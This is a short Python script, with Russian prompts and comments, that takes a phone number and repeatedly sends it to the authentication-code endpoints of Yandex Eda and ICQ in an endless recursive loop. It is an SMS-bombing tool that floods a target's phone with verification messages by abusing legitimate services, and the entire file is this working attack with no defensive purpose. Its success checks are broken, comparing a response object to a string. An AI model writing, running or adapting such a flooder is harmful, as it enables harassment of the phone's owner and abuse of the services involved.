import requests
import time

phone = input("номерок,фраерок:")
if phone[0] == '+':
    phone = phone[1:]
elif phone[0] == '8':
    phone = '7'+phone[1:]
elif phone[0] == '9':
    phone = '7'+phone




def sms():
    try:
        time.sleep(2)
        #requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
        dy=requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, timeout=10)
    except:
        print("some code error,разработчик кретин")
        pass
    else:
        if dy==("<Response [201]>"):
            print("сообщение отправлено:яндекс")
        else:
            pass
        
        
    try:
        time.sleep(2)
        #requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
        di=requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"},  timeout=10)
    except:
        print("some code error,разработчик кретин")
        pass
    else:
        if di==("<Response [200]>"):
            print("сообщение отправлено:icq")
            pass
    sms()
sms()